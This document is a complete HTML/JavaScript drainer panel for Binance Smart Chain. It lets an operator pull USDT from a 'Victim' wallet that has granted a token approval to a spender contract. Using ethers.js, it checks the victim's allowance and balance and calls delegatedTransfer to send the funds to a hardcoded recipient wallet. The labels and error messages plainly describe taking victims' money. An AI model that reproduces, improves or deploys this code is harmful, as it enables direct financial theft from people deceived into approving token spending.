<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BEP-20 Allowance & Withdraw</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 1.5rem; background: #f5f5f5; }
    .container { max-width: 500px; margin: auto; background: white; border-radius: 10px; padding: 2rem; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
    h2 { text-align: center; }
    label { display: block; margin-bottom: 5px; font-weight: bold; }
    input { width: 100%; padding: 0.7rem; margin-bottom: 1rem; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
    button { padding: 0.7rem 1.2rem; font-size: 1rem; border: none; border-radius: 6px; cursor: pointer; flex: 1; }
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 1rem; }
    #output { margin-top: 1.5rem; font-weight: bold; text-align: center; white-space: pre-wrap; padding: 1rem; border-radius: 6px; }
    .status-info { background: #e3f2fd; color: #0d47a1; margin-bottom: 1rem; padding: 10px; border-radius: 6px; font-size: 0.9rem; }
    .status-error { background: #ffebee; color: #c62828; margin-top: 1rem; }
    .status-success { background: #e8f5e9; color: #2e7d32; margin-top: 1rem; }
    .refresh-btn { font-size: 0.8rem; padding: 5px 10px; margin-left: 10px; background: #eee; }
    .debug-box { font-family: monospace; font-size: 0.8rem; text-align: left; background: #333; color: #0f0; padding: 10px; margin-top: 10px; display: none; overflow-x: auto; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Token Allowance & Withdraw</h2>
    
    <div id="walletStatus" class="status-info">🔌 Wallet: Not connected</div>
    <div id="networkStatus" class="status-info" style="background:#fff3e0; color:#e65100;">🌐 Network: Checking...</div>

    <label>USDT Contract Address:</label>
    <input type="text" id="tokenAddress" value="0x55d398326f99059ff775485246999027b3197955" />
    
    <label>Client/User Address (Victim):</label>
    <input id="fromAddress" placeholder="0x..." />
    
    <label>Recipient Address (Your Wallet):</label>
    <input type="text" id="toAddress" value="0x827F20106A28452FB889d583360C3790AB09b47F" />
    
    <label>Amount (USDT):</label>
    <input id="amount" type="number" placeholder="e.g. 10" step="any" />
    
    <label>Spender Contract Address: <button class="refresh-btn" onclick="checkContractInfo()">🔄 Refresh Info</button></label>
    <input type="text" id="contractAddress" value="0xC7Be78Ed795188938C175e1D4a494b1691FDfc27" onchange="checkContractInfo()" />

    <div id="contractInfo" class="status-info" style="display:none;">⏳ Waiting for wallet connection...</div>

    <div class="btn-row">
      <button onclick="checkAllowance()" style="background: #e0e0e0;">🔍 Check Allowance</button>
      <button onclick="withdraw()" style="background: #4CAF50; color: white;">💸 Withdraw Funds</button>
    </div>

    <p id="output"></p>
    <div id="debugBox" class="debug-box"></div>
  </div>

  <script>
    const contractABI = [
      "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
      "function owner() external view returns (address)"
    ];

    async function ensureBSC() {
      if (!window.ethereum) return false;
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();
      if (network.chainId !== 56) {
        try {
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
          return true;
        } catch (err) {
          alert("Please add/switch to Binance Smart Chain.");
          return false;
        }
      }
      return true;
    }

    async function updateStatus() {
      if (!window.ethereum) return;
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.listAccounts();
      const network = await provider.getNetwork();
      
      const wStatus = document.getElementById("walletStatus");
      const nStatus = document.getElementById("networkStatus");

      if (accounts.length > 0) {
        wStatus.innerText = `🔌 Connected: ${accounts[0].substring(0,6)}...${accounts[0].substring(38)}`;
      } else {
        wStatus.innerText = "🔌 Wallet: Not connected";
      }

      if (network.chainId === 56) {
        nStatus.innerText = "🌐 Network: Binance Smart Chain ✅";
        nStatus.style.background = "#e8f5e9";
        nStatus.style.color = "#2e7d32";
      } else {
        nStatus.innerText = `🌐 Network: WRONG NETWORK (Chain ID: ${network.chainId}) ❌`;
        nStatus.style.background = "#ffebee";
        nStatus.style.color = "#c62828";
      }
      checkContractInfo();
    }

    async function checkContractInfo() {
      const contractAddress = document.getElementById("contractAddress").value;
      const infoDiv = document.getElementById("contractInfo");
      if (!ethers.utils.isAddress(contractAddress) || !window.ethereum) return;

      infoDiv.style.display = "block";
      infoDiv.innerText = "⏳ Checking contract...";

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const code = await provider.getCode(contractAddress);
        if (code === "0x") {
          infoDiv.innerText = "❌ No contract found at this address on BSC!";
          return;
        }

        const contract = new ethers.Contract(contractAddress, contractABI, provider);
        const owner = await contract.owner();
        infoDiv.innerText = `👑 Contract Owner: ${owner}`;
        
        const accounts = await provider.listAccounts();
        if (accounts.length > 0 && accounts[0].toLowerCase() !== owner.toLowerCase()) {
          infoDiv.innerHTML += `<br/><span style="color:red; font-weight:bold;">⚠️ WARNING: You are NOT the owner! Only ${owner} can withdraw.</span>`;
        } else if (accounts.length > 0) {
          infoDiv.innerHTML += `<br/><span style="color:green; font-weight:bold;">✅ You are the owner! Ready to withdraw.</span>`;
        }
      } catch (err) {
        infoDiv.innerText = "❌ Error: Could not fetch owner. Ensure you are on BSC.";
        console.error(err);
      }
    }

    async function checkAllowance() {
      const output = document.getElementById("output");
      output.innerText = "⏳ Checking allowance...";
      output.className = "";

      const isBSC = await ensureBSC();
      if (!isBSC) return;

      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const spender = document.getElementById("contractAddress").value;

      if (!ethers.utils.isAddress(from)) {
        output.innerText = "❌ Please enter a valid victim address.";
        output.className = "status-error";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        await updateStatus();
        
        const token = new ethers.Contract(tokenAddress, [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function balanceOf(address account) view returns (uint256)"
        ], provider);

        const [allowance, balance] = await Promise.all([
          token.allowance(from, spender),
          token.balanceOf(from)
        ]);

        output.innerText = `✅ Allowance: ${ethers.utils.formatUnits(allowance, 18)} USDT\n💰 Balance: ${ethers.utils.formatUnits(balance, 18)} USDT`;
        output.className = "status-success";
      } catch (err) {
        output.innerText = "❌ Error checking allowance.";
        output.className = "status-error";
        console.error(err);
      }
    }

    async function withdraw() {
      const output = document.getElementById("output");
      const debugBox = document.getElementById("debugBox");
      output.innerText = "⏳ Initializing withdrawal...";
      output.className = "status-info";
      debugBox.style.display = "none";
      debugBox.innerText = "";

      const isBSC = await ensureBSC();
      if (!isBSC) return;

      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const to = document.getElementById("toAddress").value;
      const amount = document.getElementById("amount").value;
      const contractAddress = document.getElementById("contractAddress").value;

      if (!amount || amount <= 0) {
        output.innerText = "❌ Please enter a valid amount.";
        output.className = "status-error";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const myAddress = await signer.getAddress();
        const contract = new ethers.Contract(contractAddress, contractABI, signer);

        const amountParsed = ethers.utils.parseUnits(amount.toString(), 18);

        // Step 2: Check allowance and balance manually
        const token = new ethers.Contract(tokenAddress, ["function allowance(address,address) view returns (uint256)", "function balanceOf(address) view returns (uint256)"], provider);
        const [allowance, balance] = await Promise.all([
          token.allowance(from, contractAddress),
          token.balanceOf(from)
        ]);
        
        if (balance.lt(amountParsed)) {
          throw new Error(`INSUFFICIENT BALANCE: Victim only has ${ethers.utils.formatUnits(balance, 18)} USDT.`);
        }

        if (allowance.lt(amountParsed)) {
          throw new Error(`INSUFFICIENT ALLOWANCE: The victim (${from}) has not approved the contract yet. Currently approved: ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
        }

        // --- PRE-FLIGHT DEBUGGING ---
        output.innerText = "🔍 Debugging transaction...";
        debugBox.style.display = "block";
        debugBox.innerText = "> Running pre-flight check...\n";

        try {
          // Attempt static call to see if it would fail
          await contract.callStatic.delegatedTransfer(tokenAddress, from, to, amountParsed);
          debugBox.innerText += "> Static call: SUCCESS ✅\n";
        } catch (staticErr) {
          debugBox.innerText += `> Static call: FAILED ❌\n> Reason: ${staticErr.reason || "Reverted (no reason)"}\n`;
          debugBox.innerText += `> Full Error: ${JSON.stringify(staticErr.error || staticErr, null, 2)}`;
          throw new Error("REVERTED: " + (staticErr.reason || "Transaction would fail. Check Owner/Allowance/Balance."));
        }

        output.innerText = "⏳ Confirm in MetaMask...";
        // Step 3: Execute with forced gas limit and price
        const gasPrice = await provider.getGasPrice();
        // Ensure gas price is at least 3 Gwei
        const minGasPrice = ethers.utils.parseUnits("3", "gwei");
        const finalGasPrice = gasPrice.gt(minGasPrice) ? gasPrice : minGasPrice;

        const tx = await contract.delegatedTransfer(
          tokenAddress, from, to, amountParsed,
          { 
            gasLimit: 500000, // Increased gas limit
            gasPrice: finalGasPrice 
          }
        );
        
        output.innerText = "⏳ Transaction sent! Waiting for block...";
        debugBox.innerText += `> Tx Hash: ${tx.hash}\n> Waiting for confirmation...\n`;
        await tx.wait();
        
        output.innerText = "✅ WITHDRAWAL SUCCESSFUL!";
        output.className = "status-success";
        debugBox.innerText += "> Confirmed! Funds moved. ✅";
      } catch (err) {
        console.error(err);
        output.innerText = err.message || "Withdraw failed.";
        output.className = "status-error";
        if (!debugBox.innerText.includes("FAILED")) {
          debugBox.style.display = "block";
          debugBox.innerText += `> Error: ${err.message}\n> Full details in console.`;
        }
      }
    }

    window.addEventListener('load', () => {
      if (window.ethereum) {
        window.ethereum.on('accountsChanged', updateStatus);
        window.ethereum.on('chainChanged', () => window.location.reload());
        updateStatus();
      }
    });
  </script>
</body>
</html>
